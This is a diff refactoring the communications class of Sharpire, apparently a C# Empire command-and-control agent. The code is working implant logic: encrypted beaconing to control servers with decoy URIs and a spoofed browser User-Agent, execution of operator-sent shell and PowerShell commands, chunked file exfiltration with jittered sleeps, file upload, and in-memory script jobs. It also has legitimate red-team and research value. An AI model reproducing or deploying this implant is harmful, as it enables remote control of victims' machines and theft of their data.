@@ -12,60 +12,36 @@ namespace Sharpire
 {
     class Coms
     {
-        private String sessionId {get; set;}
-        private String stagingKey {get; set;}
-        private Byte[] stagingKeyBytes {get; set;}
-        private String sessionKey { get; set; }
-        private Byte[] sessionKeyBytes { get; set; }
+        private SessionInfo sessionInfo;
 
-        public Int32 agentDelay {get; set;}
-        public Int32 agentJitter { get; set; }
-        public Int32 sleepTime { get; set; }
-
-        public Int32 missedCheckins { get; set; }
-        public Int32 lostLimit { get; set; }
-
-        private Int32 ServerIndex = 0;
-        private String[] controlServers { get; set; }
-
-        private String[] taskURIs = { "/admin/get.php", "/news.php", "/login/process.php" };
-        private String userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+        internal int MissedCheckins { get; set; }
+        private int ServerIndex = 0;
 
         private JobTracking jobTracking;
 
-        internal Coms(String sessionId, String stagingKey, String sessionKey, String[] controlServers)
+        ////////////////////////////////////////////////////////////////////////////////
+        // Default Constructor
+        ////////////////////////////////////////////////////////////////////////////////
+        internal Coms(SessionInfo sessionInfo)
         {
-            this.sessionId = sessionId;
-            this.stagingKey = stagingKey;
-            this.sessionKey = sessionKey;
-            stagingKeyBytes = Encoding.ASCII.GetBytes(stagingKey);
-            sessionKeyBytes = Encoding.ASCII.GetBytes(sessionKey);
-
-            this.controlServers = controlServers;
-
-            agentDelay = 5;
-            agentJitter = 1;
-            sleepTime = 0;
-
-            missedCheckins = 0;
-            lostLimit = 50;
+            this.sessionInfo = sessionInfo;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private byte[] newRoutingPacket(byte[] encryptedBytes, Int32 meta)
+        private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
         {
-            Int32 encryptedBytesLength = 0;
+            int encryptedBytesLength = 0;
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
                 encryptedBytesLength = encryptedBytes.Length;
             }
 
-            byte[] data = Encoding.ASCII.GetBytes(sessionId);
+            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentID());
             data = Misc.combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
-            byte[] initializationVector = newInitializationVector(4);
-            byte[] rc4Key = Misc.combine(initializationVector, stagingKeyBytes);
+            byte[] initializationVector = NewInitializationVector(4);
+            byte[] rc4Key = Misc.combine(initializationVector, sessionInfo.GetStagingKeyBytes());
             byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);
 
             routingPacketData = Misc.combine(initializationVector, routingPacketData);
@@ -78,7 +54,7 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        internal void decodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
+        internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
         {
             this.jobTracking = jobTracking;
 
@@ -86,7 +62,7 @@ namespace Sharpire
             {
                 return;
             }
-            Int32 offset = 0;
+            int offset = 0;
             while (offset < packetData.Length)
             {
                 byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
@@ -94,10 +70,10 @@ namespace Sharpire
                 byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
                 offset += 20;
 
-                byte[] rc4Key = Misc.combine(routingInitializationVector, stagingKeyBytes);
+                byte[] rc4Key = Misc.combine(routingInitializationVector, sessionInfo.GetStagingKeyBytes());
 
                 byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
-                String packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
+                string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                 try
                 {
                     byte language = routingPacket[8];
@@ -106,52 +82,51 @@ namespace Sharpire
                 catch (IndexOutOfRangeException) { }
 
                 byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
-                UInt32 packetLength = BitConverter.ToUInt32(routingData, 12);
+                uint packetLength = BitConverter.ToUInt32(routingData, 12);
 
                 if (packetLength < 0)
                 {
                     break;
                 }
 
-                if (sessionId == packetSessionId)
+                if (sessionInfo.GetAgentID() == packetSessionId)
                 {
-                    byte[] encryptedData = packetData.Skip(offset).Take(offset + (Int32)packetLength - 1).ToArray();
-                    offset += (Int32)packetLength;
+                    byte[] encryptedData = packetData.Skip(offset).Take(offset + (int)packetLength - 1).ToArray();
+                    offset += (int)packetLength;
                     try
                     {
-                        processTaskingPackets(encryptedData);
+                        ProcessTaskingPackets(encryptedData);
                     }
-                    catch (Exception error)
-                    {
-                    }
+                    catch (Exception) { }
                 }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        internal byte[] getTask()
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        internal byte[] GetTask()
         {
             byte[] results = new byte[0];
             try
             {
-                Byte[] routingPacket = newRoutingPacket(null, 4);
-                String routingCookie = Convert.ToBase64String(routingPacket);
+                byte[] routingPacket = NewRoutingPacket(null, 4);
+                string routingCookie = Convert.ToBase64String(routingPacket);
 
                 WebClient webClient = new WebClient();
-
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
-                webClient.Headers.Add("User-Agent", userAgent);
+                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
                 webClient.Headers.Add("Cookie", "session=" + routingCookie);
 
                 Random random = new Random();
-                String selectedTaskURI = taskURIs[random.Next(0, taskURIs.Length)];
-                results = webClient.DownloadData(controlServers[ServerIndex] + selectedTaskURI);
+                string selectedTaskURI = sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)];
+                results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
             }
             catch (WebException webException)
             {
-                missedCheckins++;
-                if ((Int32)((HttpWebResponse)webException.Response).StatusCode == 401)
+                MissedCheckins++;
+                if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
                 {
                     //Restart everything
                 }
@@ -160,15 +135,16 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        internal void sendMessage(byte[] packets)
+        ////////////////////////////////////////////////////////////////////////////////
+        internal void SendMessage(byte[] packets)
         {
             Console.WriteLine("Sending");
-            Byte[] ivBytes = newInitializationVector(16);
-            Byte[] encryptedBytes = new byte[0];
+            byte[] ivBytes = NewInitializationVector(16);
+            byte[] encryptedBytes = new byte[0];
             using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
             {
                 aesCrypto.Mode = CipherMode.CBC;
-                aesCrypto.Key = sessionKeyBytes;
+                aesCrypto.Key = sessionInfo.GetSessionKeyBytes();
                 aesCrypto.IV = ivBytes;
                 ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                 encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
@@ -176,26 +152,26 @@ namespace Sharpire
             encryptedBytes = Misc.combine(ivBytes, encryptedBytes);
 
             HMACSHA256 hmac = new HMACSHA256();
-            hmac.Key = sessionKeyBytes;
-            Byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
+            hmac.Key = sessionInfo.GetSessionKeyBytes();
+            byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
             encryptedBytes = Misc.combine(encryptedBytes, hmacBytes);
 
-            Byte[] routingPacket = newRoutingPacket(encryptedBytes, 5);
+            byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);
 
             Random random = new Random();
-            String controlServer = controlServers[random.Next(controlServers.Length)];
+            string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
 
             if (controlServer.StartsWith("http"))
             {
                 WebClient webClient = new WebClient();
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
-                webClient.Headers.Add("User-Agent", userAgent);
+                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
                 //Add custom headers
                 try
                 {
-                    String taskUri = taskURIs[random.Next(taskURIs.Length)];
-                    Byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    string taskUri = sessionInfo.GetTaskURIs()[random.Next(sessionInfo.GetTaskURIs().Length)];
+                    byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                 }
                 catch (WebException) { }
             }
@@ -203,15 +179,17 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private void processTaskingPackets(byte[] encryptedTask)
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        private void ProcessTaskingPackets(byte[] encryptedTask)
         {
-            byte[] taskingBytes = EmpireStager.aesDecrypt(sessionKey, encryptedTask);
-            PACKET firstPacket = decodePacket(taskingBytes, 0);
+            byte[] taskingBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), encryptedTask);
+            PACKET firstPacket = DecodePacket(taskingBytes, 0);
             byte[] resultPackets = processTasking(firstPacket);
-            sendMessage(resultPackets);
+            SendMessage(resultPackets);
 
-            Int32 offset = 12 + (Int32)firstPacket.length;
-            String remaining = firstPacket.remaining;
+            int offset = 12 + (int)firstPacket.length;
+            string remaining = firstPacket.remaining;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -219,86 +197,86 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         private byte[] processTasking(PACKET packet)
         {
-            Byte[] returnPacket = new Byte[0];
+            byte[] returnPacket = new byte[0];
             try
             {
                 //Change this to a switch : case
-                Int32 type = packet.type;
+                int type = packet.type;
                 switch (type)
                 {
                     case 1:
-                        Byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
-                        String systemInformation = Encoding.ASCII.GetString(systemInformationBytes);
-                        return encodePacket(1, systemInformation, packet.taskId);
+                        byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
+                        string systemInformation = Encoding.ASCII.GetString(systemInformationBytes);
+                        return EncodePacket(1, systemInformation, packet.taskId);
                     case 2:
-                        String message = "[!] Agent " + sessionId + " exiting";
-                        sendMessage(encodePacket(2, message, packet.taskId));
+                        string message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting";
+                        SendMessage(EncodePacket(2, message, packet.taskId));
                         Environment.Exit(0);
                         //This is still dumb
-                        return new Byte[0];
+                        return new byte[0];
                     case 40:
-                        String[] parts = packet.data.Split(' ');
-                        String output;
+                        string[] parts = packet.data.Split(' ');
+                        string output;
                         if (1 == parts.Length)
                             output = Agent.InvokeShellCommand(parts.FirstOrDefault(), "");
                         else
-                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), String.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
-                        Byte[] packetBytes = encodePacket(packet.type, output, packet.taskId);
+                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
+                        byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
                         return packetBytes;
                     case 41:
                         return Task41(packet);
                     case 42:
                         return Task42(packet);
                     case 50:
-                        List<String> runningJobs = new List<String>(jobTracking.jobs.Keys);
-                        return encodePacket(packet.type, runningJobs.ToArray(), packet.taskId);
+                        List<string> runningJobs = new List<string>(jobTracking.jobs.Keys);
+                        return EncodePacket(packet.type, runningJobs.ToArray(), packet.taskId);
                     case 51:
-                        return task51(packet);
+                        return Task51(packet);
                     case 100:
-                        return encodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
+                        return EncodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
                     case 101:
-                        return task101(packet);
+                        return Task101(packet);
                     case 110:
-                        String jobId = jobTracking.StartAgentJob(packet.data, packet.taskId);
-                        return encodePacket(packet.type, "Job started: " + jobId, packet.taskId);
+                        string jobId = jobTracking.StartAgentJob(packet.data, packet.taskId);
+                        return EncodePacket(packet.type, "Job started: " + jobId, packet.taskId);
                     case 111:
-                        return encodePacket(packet.type, "Not Implimented", packet.taskId);
+                        return EncodePacket(packet.type, "Not Implimented", packet.taskId);
                     case 120:
-                        return task120(packet);
+                        return Task120(packet);
                     case 121:
-                        return task121(packet);
+                        return Task121(packet);
                     default:
-                        return encodePacket(0, "Invalid type: " + packet.type, packet.taskId);
+                        return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
                 }
             }
             catch (Exception error)
             {
-                return encodePacket(packet.type, "Error running command: " + error, packet.taskId);
+                return EncodePacket(packet.type, "Error running command: " + error, packet.taskId);
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        internal byte[] encodePacket(UInt16 type, String[] data, UInt16 resultId)
+        internal byte[] EncodePacket(ushort type, string[] data, ushort resultId)
         {
-            String dataString = String.Join("\n", data);
-            return encodePacket(type, dataString, resultId);
+            string dataString = string.Join("\n", data);
+            return EncodePacket(type, dataString, resultId);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         // Check this one for UTF8 Errors
         ////////////////////////////////////////////////////////////////////////////////
-        internal Byte[] encodePacket(UInt16 type, String data, UInt16 resultId)
+        internal byte[] EncodePacket(ushort type, string data, ushort resultId)
         {
             Console.WriteLine(data);
             data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
-            byte[] packet = new Byte[12 + data.Length];
+            byte[] packet = new byte[12 + data.Length];
 
-            BitConverter.GetBytes((Int16)type).CopyTo(packet, 0);
+            BitConverter.GetBytes((short)type).CopyTo(packet, 0);
 
-            BitConverter.GetBytes((Int16)1).CopyTo(packet, 2);
-            BitConverter.GetBytes((Int16)1).CopyTo(packet, 4);
+            BitConverter.GetBytes((short)1).CopyTo(packet, 2);
+            BitConverter.GetBytes((short)1).CopyTo(packet, 4);
 
-            BitConverter.GetBytes((Int16)resultId).CopyTo(packet, 6);
+            BitConverter.GetBytes((short)resultId).CopyTo(packet, 6);
 
             BitConverter.GetBytes(data.Length).CopyTo(packet, 8);
             Encoding.UTF8.GetBytes(data).CopyTo(packet, 12);
@@ -313,17 +291,19 @@ namespace Sharpire
         public struct PACKET
         {
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
-            public UInt16 type;
-            public UInt16 totalPackets;
-            public UInt16 packetNumber;
-            public UInt16 taskId;
-            public UInt32 length;
-            public String data;
-            public String remaining;
+            public ushort type;
+            public ushort totalPackets;
+            public ushort packetNumber;
+            public ushort taskId;
+            public uint length;
+            public string data;
+            public string remaining;
         };
 
         ////////////////////////////////////////////////////////////////////////////////
-        private PACKET decodePacket(Byte[] packet, Int32 offset)
+        // 
+        ////////////////////////////////////////////////////////////////////////////////
+        private PACKET DecodePacket(byte[] packet, int offset)
         {
             PACKET packetStruct = new PACKET();
             packetStruct.type = BitConverter.ToUInt16(packet, 0 + offset);
@@ -331,10 +311,10 @@ namespace Sharpire
             packetStruct.packetNumber = BitConverter.ToUInt16(packet, 4 + offset);
             packetStruct.taskId = BitConverter.ToUInt16(packet, 6 + offset);
             packetStruct.length = BitConverter.ToUInt32(packet, 8 + offset);
-            Int32 takeLength = 12 + (Int32)packetStruct.length + offset - 1;
-            Byte[] dataBytes = packet.Skip(12 + offset).Take(takeLength).ToArray();
+            int takeLength = 12 + (int)packetStruct.length + offset - 1;
+            byte[] dataBytes = packet.Skip(12 + offset).Take(takeLength).ToArray();
             packetStruct.data = Encoding.UTF8.GetString(dataBytes);
-            Byte[] remainingBytes = packet.Skip(takeLength).Take(packet.Length - takeLength).ToArray();
+            byte[] remainingBytes = packet.Skip(takeLength).Take(packet.Length - takeLength).ToArray();
             packet = null;
             return packetStruct;
         }
@@ -342,11 +322,11 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        internal static byte[] newInitializationVector(Int32 length)
+        internal static byte[] NewInitializationVector(int length)
         {
             Random random = new Random();
             byte[] initializationVector = new byte[length];
-            for (Int32 i = 0; i < initializationVector.Length; i++)
+            for (int i = 0; i < initializationVector.Length; i++)
             {
                 initializationVector[i] = Convert.ToByte(random.Next(0, 255));
             }
@@ -356,16 +336,16 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Download File from Agent
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] Task41(PACKET packet)
+        public byte[] Task41(PACKET packet)
         {
             try
             {
-                Int32 chunkSize = 512 * 1024;
-                String[] packetParts = packet.data.Split(' ');
-                String path = "";
+                int chunkSize = 512 * 1024;
+                string[] packetParts = packet.data.Split(' ');
+                string path = "";
                 if (packetParts.Length > 1)
                 {
-                    path = String.Join(" ", packetParts.Take(packetParts.Length - 2).ToArray());
+                    path = string.Join(" ", packetParts.Take(packetParts.Length - 2).ToArray());
                     try
                     {
                         chunkSize = Convert.ToInt32(packetParts[packetParts.Length - 1]) / 1;
@@ -397,31 +377,32 @@ namespace Sharpire
                 DirectoryInfo directoryInfo = new DirectoryInfo(path);
                 FileInfo[] completePath = directoryInfo.GetFiles(path);
 
-                Int32 index = 0;
-                String filePart = "";
+                int index = 0;
+                string filePart = "";
                 do
                 {
                     byte[] filePartBytes = Agent.getFilePart(path, index, chunkSize);
                     filePart = Convert.ToBase64String(filePartBytes);
                     if (filePart.Length > 0)
                     {
-                        String data = index.ToString() + "|" + path + "|" + filePart;
-                        sendMessage(encodePacket(packet.type, data, packet.taskId));
+                        string data = index.ToString() + "|" + path + "|" + filePart;
+                        SendMessage(EncodePacket(packet.type, data, packet.taskId));
                         index++;
-                        if (agentDelay != 0)
+                        if (sessionInfo.GetDefaultDelay() != 0)
                         {
-                            Int32 max = (agentJitter + 1) * agentDelay;
-                            if (max > Int32.MaxValue)
+                            int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
+                            if (max > int.MaxValue)
                             {
-                                max = Int32.MaxValue - 1;
+                                max = int.MaxValue - 1;
                             }
 
-                            Int32 min = (agentJitter - 1) * agentDelay;
+                            int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
                             if (min < 0)
                             {
                                 min = 0;
                             }
 
+                            int sleepTime;
                             if (min == max)
                             {
                                 sleepTime = min;
@@ -436,35 +417,35 @@ namespace Sharpire
                         GC.Collect();
                     }
                 } while (filePart.Length != 0);
-                return encodePacket(packet.type, "[*] File download of " + path + " completed", packet.taskId);
+                return EncodePacket(packet.type, "[*] File download of " + path + " completed", packet.taskId);
             }
             catch
             {
-                return encodePacket(packet.type, "[!] File does not exist or cannot be accessed", packet.taskId);
+                return EncodePacket(packet.type, "[!] File does not exist or cannot be accessed", packet.taskId);
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         // Upload File to Agent
         ////////////////////////////////////////////////////////////////////////////////
-        private Byte[] Task42(PACKET packet)
+        private byte[] Task42(PACKET packet)
         {
             Console.WriteLine(packet.data);
-            String[] parts = packet.data.Split('|');
+            string[] parts = packet.data.Split('|');
             if (2 > parts.Length)
-                return encodePacket(packet.type, "[!] Upload failed - No Delimiter", packet.taskId);
+                return EncodePacket(packet.type, "[!] Upload failed - No Delimiter", packet.taskId);
 
-            String fileName = parts.First();
-            String base64Part = parts[1];
+            string fileName = parts.First();
+            string base64Part = parts[1];
 
-            Byte[] content;
+            byte[] content;
             try
             {
                 content = Convert.FromBase64String(base64Part);
             }
             catch(FormatException ex)
             {
-                return encodePacket(packet.type, "[!] Upload failed: " + ex.Message, packet.taskId);
+                return EncodePacket(packet.type, "[!] Upload failed: " + ex.Message, packet.taskId);
             }
 
             try
@@ -476,67 +457,75 @@ namespace Sharpire
                         try
                         {
                             binaryWriter.Write(content);
-                            return encodePacket(packet.type, "[*] Upload of " + fileName + " successful", packet.taskId);
+                            return EncodePacket(packet.type, "[*] Upload of " + fileName + " successful", packet.taskId);
                         }
                         catch
                         {
-                            return encodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
+                            return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
                         }
                     }
                 }
             }
             catch
             {
-                return encodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
+                return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private Byte[] task51(PACKET packet)
+        // Kill Job
+        ////////////////////////////////////////////////////////////////////////////////
+        private byte[] Task51(PACKET packet)
         {
             try
             {
-                String output = jobTracking.jobs[packet.data].GetOutput();
+                string output = jobTracking.jobs[packet.data].GetOutput();
                 if (output.Trim().Length > 0)
                 {
-                    encodePacket(packet.type, output, packet.taskId);
+                    EncodePacket(packet.type, output, packet.taskId);
                 }
                 Console.WriteLine(packet.taskId);
                 jobTracking.jobs[packet.data].KillThread();
-                return encodePacket(packet.type, "Job " + packet.data + " killed.", packet.taskId);
+                return EncodePacket(packet.type, "Job " + packet.data + " killed.", packet.taskId);
             }
             catch
             {
-                return encodePacket(packet.type, "[!] Error in stopping job: " + packet.data, packet.taskId);
+                return EncodePacket(packet.type, "[!] Error in stopping job: " + packet.data, packet.taskId);
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task101(PACKET packet)
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public byte[] Task101(PACKET packet)
         {
-            String prefix = packet.data.Substring(0, 15);
-            String extension = packet.data.Substring(15, 5);
-            String output = Agent.RunPowerShell(packet.data.Substring(20));
-            return encodePacket(packet.type, prefix + extension + output, packet.taskId);
+            string prefix = packet.data.Substring(0, 15);
+            string extension = packet.data.Substring(15, 5);
+            string output = Agent.RunPowerShell(packet.data.Substring(20));
+            return EncodePacket(packet.type, prefix + extension + output, packet.taskId);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task120(PACKET packet)
+        // Load PowerShell Script
+        ////////////////////////////////////////////////////////////////////////////////
+        public byte[] Task120(PACKET packet)
         {
             Random random = new Random();
-            Byte[] initializationVector = new Byte[16];
+            byte[] initializationVector = new byte[16];
             random.NextBytes(initializationVector);
-            jobTracking.ImportedScript = EmpireStager.aesEncrypt(sessionKeyBytes, initializationVector, Encoding.ASCII.GetBytes(packet.data));
-            return encodePacket(packet.type, "Script successfully saved in memory", packet.taskId);
+            jobTracking.ImportedScript = EmpireStager.aesEncrypt(sessionInfo.GetSessionKeyBytes(), initializationVector, Encoding.ASCII.GetBytes(packet.data));
+            return EncodePacket(packet.type, "Script successfully saved in memory", packet.taskId);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task121(PACKET packet)
+        // Run an Agent Job
+        ////////////////////////////////////////////////////////////////////////////////
+        public byte[] Task121(PACKET packet)
         {
-            Byte[] scriptBytes = EmpireStager.aesDecrypt(sessionKey, jobTracking.ImportedScript);
-            String script = Encoding.UTF8.GetString(scriptBytes);
-            String jobId = jobTracking.StartAgentJob(script + ";" + packet.data, packet.taskId);
-            return encodePacket(packet.type, "Job started: " + jobId, packet.taskId);
+            byte[] scriptBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), jobTracking.ImportedScript);
+            string script = Encoding.UTF8.GetString(scriptBytes);
+            string jobId = jobTracking.StartAgentJob(script + ";" + packet.data, packet.taskId);
+            return EncodePacket(packet.type, "Job started: " + jobId, packet.taskId);
         }
     }
 }
